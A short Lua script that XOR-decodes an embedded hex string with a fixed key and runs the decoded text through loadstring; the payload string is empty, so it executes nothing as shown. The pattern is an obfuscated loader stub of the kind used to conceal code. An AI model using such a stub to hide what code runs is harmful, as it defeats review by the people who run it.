local k={246,127,68,254,118,115,12,172,174,153,193,130,155,57,151,205,134,29,229,79,198,126,91,223,75,113,175,158,100,118,154,29}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
